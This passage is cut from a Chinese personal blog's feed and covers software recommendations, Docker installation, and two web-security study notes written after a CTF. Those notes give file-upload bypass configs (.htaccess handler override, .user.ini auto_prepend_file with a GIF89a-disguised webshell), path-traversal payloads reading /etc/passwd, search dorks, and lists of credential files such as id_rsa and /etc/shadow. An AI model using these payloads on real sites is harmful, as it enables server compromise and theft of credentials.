&lt;p&gt;​        说明：拼接两个url的绝对路径&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="http://zhihening.me/categories/study/"/>
    
    
      <category term="学习新知识" scheme="http://zhihening.me/tags/%E5%AD%A6%E4%B9%A0%E6%96%B0%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>软件推荐</title>
    <link href="http://zhihening.me/2019/11/06/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <id>http://zhihening.me/2019/11/06/软件推荐/</id>
    <published>2019-11-06T10:00:00.000Z</published>
    <updated>2020-08-14T06:12:55.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h1><p>​        推荐的软件都是我现在在用的。有些软件开发者已经不再更新了，但功能却是很完善的。而这些工具能够极大的提高你的工作效率。每个推荐工具的标题都链接着这个工具的下载地址。如果失效请及时与作者联系。</p><a id="more"></a><h2 id="1-Snipaste"><a href="#1-Snipaste" class="headerlink" title="1.Snipaste"></a>1.<a href="https://www.snipaste.com/" target="_blank" rel="noopener">Snipaste</a></h2><p><img src="/images/20191106_125141.png" alt=""></p><p>​        这个软件是 国人开发的一款截图软件，挺简洁的 ，当然很多人都在使用windows自带的截图工具截图或者qq截图，但我想推荐的仍然是这个。他的功能很简单，就是截屏和贴图，快捷键可以自己进行设定。真正让我强烈推荐的，是他的贴图功能，可以无障碍的贴在任何地方，并且覆盖在其上面。无论进行什么操作，都在上面覆盖。这样当你有两个或者多个文档中的特定句子需要联系在一起的时候，你会感觉到它是多么强大。这篇文章中的截图都是出自它手哦。</p><h2 id="2-f-lux"><a href="#2-f-lux" class="headerlink" title="2.f.lux"></a>2.<a href="https://justgetflux.com/" target="_blank" rel="noopener">f.lux</a></h2><p>​        <img src="/images/20191106_125852.png" alt=""></p><p>​        这个软件是一个屏保软件，不同于其他屏保软件，它比较专注于视力保护。作为一个程序员，长期盯着电脑难免眼睛会受到影响，这个软件可以根据时间调整屏幕颜色，减少蓝光对实例的影响。类似于手机开启的护眼模式。而且可以自己调整时间。十分方便。</p><h2 id="3-Ditto"><a href="#3-Ditto" class="headerlink" title="3.Ditto"></a>3.<a href="https://ditto-cp.sourceforge.io/" target="_blank" rel="noopener">Ditto</a></h2><p><img src="/images/20191107_093013.png" alt="20191107_093013"></p><p>​        这是一个比较小众的工具。主要功能是一个剪贴板的功能，可以记录你上一步复制的内容，只需要设置快捷键即可，对于经常用于文字编辑的同学，可谓是神器了。</p><h2 id="4-WGesture"><a href="#4-WGesture" class="headerlink" title="4.WGesture"></a>4.<a href="http://www.yingdev.com/projects/wgestures" target="_blank" rel="noopener">WGesture</a></h2><p>​        <img src="/images/20191106_165801.png" alt=""></p><p>​        这个软件也算是一个小众软件，主要的作用便是鼠标手势，且是全局鼠标手势！尽管现在已经不更新了，但使用到现在依旧没发现什么很大的bug，仅有的一项是，如果你打开了VMware虚拟机，那么在虚拟机中的右键可能会受到影响，只要退出该应用即可。简单方便。你值得拥有。</p><h2 id="5-火柴-、uTools-、Everything"><a href="#5-火柴-、uTools-、Everything" class="headerlink" title="5.火柴 、uTools 、Everything"></a>5.<a href="http://huochaipro.com/" target="_blank" rel="noopener">火柴</a> 、<a href="https://u.tools/" target="_blank" rel="noopener">uTools</a> 、<a href="https://www.voidtools.com/zh-cn/" target="_blank" rel="noopener">Everything</a></h2><p>​        <img src="/images/20191106_173024.png" alt=""></p><p>​        火柴的前身是火萤酱。之前的火萤酱感觉没有现在的火柴好用。不过都是只需要双击Ctrl键就可以启动。相比于everything来说，火柴多了很多拓展功能。可以自定义添加许多插件，可以在内网中进行聊天和传输文件。类似于这个软件的一个软件交utools，也是可以添加插件的。不过它们的查找仍然还是基于everything的，所以如果想要简洁一些的，可以使用everything，如果想要拓展一些其他功能，可以选用火柴或者utools。目前我在用火柴。</p><h2 id="6-Bandizip-、-7zip"><a href="#6-Bandizip-、-7zip" class="headerlink" title="6.Bandizip 、 7zip"></a>6.<a href="http://www.bandisoft.com/bandizip/" target="_blank" rel="noopener">Bandizip</a> 、 <a href="https://www.7-zip.org/" target="_blank" rel="noopener">7zip</a></h2><p>​        <img src="/images/20191106_173249.png" alt=""></p><p>​        这是一款解压软件，清新简介，功能很强大。可以设置双击自动解压。从看到这个软件开始就一直在用。很强大。相同的软件同样推荐7zip</p><h2 id="7-Typora"><a href="#7-Typora" class="headerlink" title="7.Typora"></a>7.<a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a></h2><p>​        <img src="/images/20191106_174331.png" alt="20191106_174331"></p><p>​        韩国的一款Markdown写作工具，具有Markdown所需的所有功能，书写画面也是十分简介，还是免费的。喜欢简单的人可入。这篇文章就是这个工具写的。</p><h2 id="8-PasteEx"><a href="#8-PasteEx" class="headerlink" title="8.PasteEx"></a>8.<a href="https://github.com/huiyadanli/PasteEx/blob/master/README_CN.md" target="_blank" rel="noopener">PasteEx</a></h2><p>​        <img src="/images/20191106_175129.png" alt="20191106_175129"></p><p>​        这是一个可以把剪切板中的内容直接粘贴成文件的工具。比如你截一个图以后，点击右键粘贴为文件，就可以直接把所截的图片粘贴为你想要的格式的文件。还可以选择保存的位置。十分方便。</p><h2 id="9-PotPlayer"><a href="#9-PotPlayer" class="headerlink" title="9.PotPlayer"></a>9.<a href="http://www.potplayer.org/" target="_blank" rel="noopener">PotPlayer</a></h2><p><img src="/images/20191106_175550.png" alt="20191106_175550"></p><p>这是一个视频播放软件。相比于暴风影音，无广告，且能力出众，谁用谁知道。</p><h2 id="10-Clover"><a href="#10-Clover" class="headerlink" title="10.Clover"></a>10.<a href="http://cn.ejie.me/" target="_blank" rel="noopener">Clover</a></h2><p> <img src="/images/20191106_180203.png" alt="20191106_180203"></p><p>Clover 是 Windows Explorer 资源管理器的一个扩展，为其增加类似谷歌 Chrome 浏览器的多标签页功能。 也就是你打开的我的电脑，也会带有标签。方便管理。</p><h2 id="11-or-others"><a href="#11-or-others" class="headerlink" title="11 or others"></a>11 or others</h2><p>好用的工具有很多，主要看你怎么用，有怎么样的需求，就有怎么样的工具能够帮到你。这里放一个工具推荐的<a href="https://adzhp.cn/xiao-lv-gong-ju.html" target="_blank" rel="noopener">网站</a>，我没有提到的必定有很多，这里推荐的都是我现阶段都在用的工具，感觉十分方便。以后再做更新。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;软件推荐&quot;&gt;&lt;a href=&quot;#软件推荐&quot; class=&quot;headerlink&quot; title=&quot;软件推荐&quot;&gt;&lt;/a&gt;软件推荐&lt;/h1&gt;&lt;p&gt;​        推荐的软件都是我现在在用的。有些软件开发者已经不再更新了，但功能却是很完善的。而这些工具能够极大的提高你的工作效率。每个推荐工具的标题都链接着这个工具的下载地址。如果失效请及时与作者联系。&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="http://zhihening.me/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="软件推荐" scheme="http://zhihening.me/tags/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
  <entry>
    <title>Web安全之文件上传漏洞中的其他绕过姿势</title>
    <link href="http://zhihening.me/2019/08/23/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
    <id>http://zhihening.me/2019/08/23/Web安全学习之文件上传漏洞中的其他绕过姿势/</id>
    <published>2019-08-23T09:04:56.000Z</published>
    <updated>2019-09-02T13:12:07.068Z</updated>
    
    <content type="html"><![CDATA[<p>前几天打SUCTF的时候，遇到了一个上传文件的题目，是需要上传.user.ini进行绕过。作为一个刚刚入坑的web手，自然是不知道，问了师傅后，师傅又传授了几个文件绕过姿势，在此记录一下。</p><a id="more"></a><h2 id="1-htaccess文件构造后门"><a href="#1-htaccess文件构造后门" class="headerlink" title="1 .htaccess文件构造后门"></a>1 .htaccess文件构造后门</h2><p>.htaccess是<strong>Apache HTPP Server</strong>的文件目录系统级别的配置文件的默认的名字，它提供了再主配置文件中定义用户自定义指令的支持。它可以实现：网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、jinzhi8目录列表、配置默认文档等功能。也就是我们可以通过这个文件达到更改Apache配置的目的。.htaccess的用途范围主要针对当前目录。</p><h3 id="1-1开启-htaccess支持"><a href="#1-1开启-htaccess支持" class="headerlink" title="1.1开启.htaccess支持"></a>1.1开启.htaccess支持</h3><p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，即将原有配置下的AllowOverride None 修改为 AllowOverride All。</p><h3 id="1-2通过-htaccess文件来控制文件的访问权限"><a href="#1-2通过-htaccess文件来控制文件的访问权限" class="headerlink" title="1.2通过.htaccess文件来控制文件的访问权限"></a>1.2通过.htaccess文件来控制文件的访问权限</h3><p>我们在很多时候会遇到这样的情况，可以上传后门文件到服务器上，但是改上传目录不能禁止外部访问，或者是不解析脚本，但如果他开启了.htaccess的支持，我们就可以通过它来重写Apache配置（只对当前目录有效），然后执行我们的脚本文件。</p><h3 id="1-3-利用方式"><a href="#1-3-利用方式" class="headerlink" title="1.3 利用方式"></a>1.3 利用方式</h3><p>利用写文件函数复写.htaccess文件，即可任意定义解析名单，通过一个.htaccess文件调用php的解释器去解析一个文件名中只要包含“test.jpg”的任意文件，所以无论文件名是什么样子，只要包含“test.jpg”这个字符串，都可以被以php的方式来解析，一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制。</p><p>建立的.htaccess文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><p>或者任意字符如：“haha”，都可以以php的方式来解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “haha”&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="2-user-ini文件构造后门"><a href="#2-user-ini文件构造后门" class="headerlink" title="2 .user.ini文件构造后门"></a>2 .user.ini文件构造后门</h2><h3 id="2-1-user-ini文件"><a href="#2-1-user-ini文件" class="headerlink" title="2.1 .user.ini文件"></a>2.1 .user.ini文件</h3><p>​        .user.ini比.htaccess文件用的更广泛，可以应用在Nginx/Apache/IIS等，只要是fastcgi运行的php都可以用这个方法。那么什么是.user.ini，.user.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中包含以下几种：</p><table><thead><tr><th>模式</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>可在用户脚本（例如ini_set()）或Windows注册表（php5.3起）以及.user.ini中设定</td></tr><tr><td>PHP_INI_PERDIR</td><td>可在php.ini，.htaccess或httpd.conf中设定</td></tr><tr><td>PHP_INI_SYSTEM</td><td>可在php.ini或httpd.conf中设定</td></tr><tr><td>PHP_INI_ALL</td><td>可在任何地方设定</td></tr></tbody></table><p>​        其中在PHP_INI_USER中提到可以在.user.ini中进行设置，官方的<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">解释</a>是：</p><p>​        除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[‘DOCUMENT_ROOT’]</a> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>​        在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p><p>​        因此，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置模式是“PHP_INI_PERDIR、PHP_INI_USER”的设置。实际上除了PHP_INI_SYSTEM以外的模式都是可以通过.user.ini来设置。并且，和php.ini不同的是，.user.ini是一个可以被动态加载的ini文件，也就是说若是修改.user.ini后，不需要重启服务器中间件，只需要等到user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><h3 id="2-2利用方式"><a href="#2-2利用方式" class="headerlink" title="2.2利用方式"></a>2.2利用方式</h3><p>​        利用php配置项中的auto_append_file和auto_prepend_file可以进行文件包含。auto_prepend_file类似于在文件前调用了require（）函数，而auto_append_file只是在文件后面包含。使用方法：</p><p>直接在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br></pre></td></tr></table></figure><p>​        01.gif就是要包含的文件。所以我们可以借助.user.ini让所有的php文件都“自动”包含某个文件。而这个文件可以是一个正常的php文件，也可以是一个webshell一句话</p><p>在01.gif可以写一个php一句话，如果有检测&lt;?和检测是否是图片或者gif文件则需要使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt;</span><br></pre></td></tr></table></figure><p>进行绕过。若是某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天打SUCTF的时候，遇到了一个上传文件的题目，是需要上传.user.ini进行绕过。作为一个刚刚入坑的web手，自然是不知道，问了师傅后，师傅又传授了几个文件绕过姿势，在此记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://zhihening.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://zhihening.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04安装Docker</title>
    <link href="http://zhihening.me/2019/08/18/Ubuntu16-04%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://zhihening.me/2019/08/18/Ubuntu16-04安装Docker/</id>
    <published>2019-08-18T07:57:27.000Z</published>
    <updated>2019-08-18T08:07:37.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-前情摘要"><a href="#0-前情摘要" class="headerlink" title="0.前情摘要"></a>0.前情摘要</h2><p>这个暑假参加了XMan的夏令营，结果进了特训营，还要自己出题，不过队里两个大佬搞好了。。感觉没有自己什么事情（听课是不可能听课的。趁着空闲学学docker（要自己打包题）的基本命令。</p><h2 id="1-基本配置环境："><a href="#1-基本配置环境：" class="headerlink" title="1.基本配置环境："></a>1.基本配置环境：</h2><p>VMware Workstation Pro + Ubuntu 16.04目前最新docker分为 docker-ce和docker-ee两个版本，其中ce为社区版免费的，ee为商业版商用的，目前测试用ce版本。这里安装过程使用的是博客园中的过程，于2019.8.15日 亲测有效。</p><a id="more"></a><h2 id="2-安装过程"><a href="#2-安装过程" class="headerlink" title="2.安装过程"></a>2.安装过程</h2><h3 id="1-首次更新"><a href="#1-首次更新" class="headerlink" title="1 首次更新"></a>1 首次更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="2-安装linux-image-extra-包"><a href="#2-安装linux-image-extra-包" class="headerlink" title="2 安装linux-image-extra-* 包"></a>2 安装linux-image-extra-* 包</h3><p>这一步不可少，不然后面安装docker会从国外网址下载，会被墙， 就会安装不成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \     linux-image-extra-$(uname -r) \     linux-image-extra-virtual</span><br></pre></td></tr></table></figure></p><h3 id="3-安装https"><a href="#3-安装https" class="headerlink" title="3 安装https"></a>3 安装https</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \     apt-transport-https \     ca-certificates \     curl \     software-properties-common</span><br></pre></td></tr></table></figure><h3 id="4-安装GPG-key"><a href="#4-安装GPG-key" class="headerlink" title="4 安装GPG key"></a>4 安装GPG key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p><img src="/images/1566040954442.png" alt=""></p><h3 id="5-验证-key的fingerprint"><a href="#5-验证-key的fingerprint" class="headerlink" title="5 验证 key的fingerprint"></a>5 验证 key的fingerprint</h3><p>验证可以的fingerprint是否为<br>9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88  </span><br><span class="line"># 如果正确，输出结果如下：</span><br></pre></td></tr></table></figure><p><img src="/images/1566040975325.png" alt=""></p><h3 id="6-安装仓库"><a href="#6-安装仓库" class="headerlink" title="6 安装仓库"></a>6 安装仓库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \    &amp;quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \    $(lsb_release -cs) \    stable&amp;quot;</span><br></pre></td></tr></table></figure><h3 id="7-再次更新"><a href="#7-再次更新" class="headerlink" title="7 再次更新"></a>7 再次更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="8-安装docker-ce"><a href="#8-安装docker-ce" class="headerlink" title="8 安装docker-ce"></a>8 安装docker-ce</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce #如果下载过慢，则属于正常现象（国外源1.9 测试 #安装成功后的一波测试</span><br></pre></td></tr></table></figure><p><img src="/images/1566041657202.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p>至此， docker在Ubuntu16.04上的安装算是完成了。注：若是出现以下报错：<br><img src="/images/1566098263745.png" alt=""></p><p>则是没有加sudo权限。在命令前加sudo即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-前情摘要&quot;&gt;&lt;a href=&quot;#0-前情摘要&quot; class=&quot;headerlink&quot; title=&quot;0.前情摘要&quot;&gt;&lt;/a&gt;0.前情摘要&lt;/h2&gt;&lt;p&gt;这个暑假参加了XMan的夏令营，结果进了特训营，还要自己出题，不过队里两个大佬搞好了。。感觉没有自己什么事情（听课是不可能听课的。趁着空闲学学docker（要自己打包题）的基本命令。&lt;/p&gt;
&lt;h2 id=&quot;1-基本配置环境：&quot;&gt;&lt;a href=&quot;#1-基本配置环境：&quot; class=&quot;headerlink&quot; title=&quot;1.基本配置环境：&quot;&gt;&lt;/a&gt;1.基本配置环境：&lt;/h2&gt;&lt;p&gt;VMware Workstation Pro + Ubuntu 16.04目前最新docker分为 docker-ce和docker-ee两个版本，其中ce为社区版免费的，ee为商业版商用的，目前测试用ce版本。这里安装过程使用的是博客园中的过程，于2019.8.15日 亲测有效。&lt;/p&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://zhihening.me/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Web安全学习之任意文件下载漏洞</title>
    <link href="http://zhihening.me/2019/08/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zhihening.me/2019/08/09/Web安全学习之任意文件下载漏洞/</id>
    <published>2019-08-09T07:01:50.000Z</published>
    <updated>2019-08-09T07:29:46.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任意文件查看与下载漏洞"><a href="#任意文件查看与下载漏洞" class="headerlink" title="任意文件查看与下载漏洞"></a>任意文件查看与下载漏洞</h2><h3 id="漏洞产生原因："><a href="#漏洞产生原因：" class="headerlink" title="漏洞产生原因："></a>漏洞产生原因：</h3><p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件<br>不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p><h3 id="漏洞利用条件："><a href="#漏洞利用条件：" class="headerlink" title="漏洞利用条件："></a>漏洞利用条件：</h3><ul><li>存在读文件的函数</li><li>读取文件的路径用户可控且未校验或校验不严</li><li>输出了文件内容</li></ul><a id="more"></a><h3 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h3><p>1.下载服务器任意文件，如脚本代码、服务及系统配置文件等<br>2.可用得到的代码进一步代码审计，得到更多可利用漏洞</p><h3 id="任意文件读取代码形式："><a href="#任意文件读取代码形式：" class="headerlink" title="任意文件读取代码形式："></a>任意文件读取代码形式：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = <span class="string">"test.txt"</span>;</span><br><span class="line">    readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = <span class="string">"test.txt"</span>;</span><br><span class="line"></span><br><span class="line">    $fp = fopen($filename,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = <span class="string">"test.txt"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="任意文件下载漏洞代码形式："><a href="#任意文件下载漏洞代码形式：" class="headerlink" title="任意文件下载漏洞代码形式："></a>任意文件下载漏洞代码形式：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接下载：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xx.com/a.zip"</span>&gt;</span>Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用 header()下载：</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = <span class="string">"uploads/201607141437284653.jpg"</span>;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用代码："><a href="#漏洞利用代码：" class="headerlink" title="漏洞利用代码："></a>漏洞利用代码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile.php?file=/etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure><h3 id="Google-search利用："><a href="#Google-search利用：" class="headerlink" title="Google search利用："></a>Google search利用：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">inurl:&quot;readfile.php?file=&quot;</span><br><span class="line">形如：</span><br><span class="line">   • download.php?path=</span><br><span class="line">    • download.php?file=</span><br><span class="line">    • down.php?file=</span><br><span class="line">    • data.php?file=</span><br><span class="line">    • readfile.php?file=</span><br><span class="line">    • read.php?filename=</span><br><span class="line">参数名：</span><br><span class="line">• &amp;RealPath= </span><br><span class="line">    • &amp;FilePath= </span><br><span class="line">    • &amp;ﬁlepath= </span><br><span class="line">    • &amp;Path= </span><br><span class="line">    • &amp;path= </span><br><span class="line">    • &amp;inputFile= </span><br><span class="line">    • &amp;url= </span><br><span class="line">    • &amp;urls= </span><br><span class="line">    • &amp;Lang= </span><br><span class="line">    • &amp;dis= </span><br><span class="line">    • &amp;data= </span><br><span class="line">    • &amp;readﬁle= </span><br><span class="line">    • &amp;ﬁlep= </span><br><span class="line">    • &amp;src= </span><br><span class="line">    • &amp;menu= </span><br><span class="line">    • META-INF </span><br><span class="line">    • WEB-INF</span><br></pre></td></tr></table></figure><h3 id="敏感文件："><a href="#敏感文件：" class="headerlink" title="敏感文件："></a>敏感文件：</h3><h4 id="Windows敏感文件："><a href="#Windows敏感文件：" class="headerlink" title="Windows敏感文件："></a>Windows敏感文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini  //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam  //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini  //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root</span><br><span class="line">C:\Windows\php.ini  //php配置信息</span><br><span class="line">C:\Windows\my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure><h4 id="Linux敏感文件："><a href="#Linux敏感文件：" class="headerlink" title="Linux敏感文件："></a>Linux敏感文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts</span><br><span class="line">/porc/config.gz</span><br></pre></td></tr></table></figure><h3 id="几种常见架构的利用过程："><a href="#几种常见架构的利用过程：" class="headerlink" title="几种常见架构的利用过程："></a>几种常见架构的利用过程：</h3><p>因为文件下载漏洞不像其他漏洞那样有通用的利用方法和相关工具，所以漏洞的利用过程与具体的网站架构关系很大，需要了解常见的网站的架构，如网站的配置文件位置等信息。下面分布介绍此漏洞在常见的几种网站中利用方法。</p><ol><li><h4 id="java站点"><a href="#java站点" class="headerlink" title="java站点"></a>java站点</h4><h5 id="1-下载tomcat-users-xml"><a href="#1-下载tomcat-users-xml" class="headerlink" title="1)下载tomcat-users.xml"></a>1)下载tomcat-users.xml</h5><p>tomcat-users.xml在conf文件下，尝试直接使用下载点下载该文件。</p><h6 id="url构造形式如下："><a href="#url构造形式如下：" class="headerlink" title="url构造形式如下："></a>url构造形式如下：</h6><figure 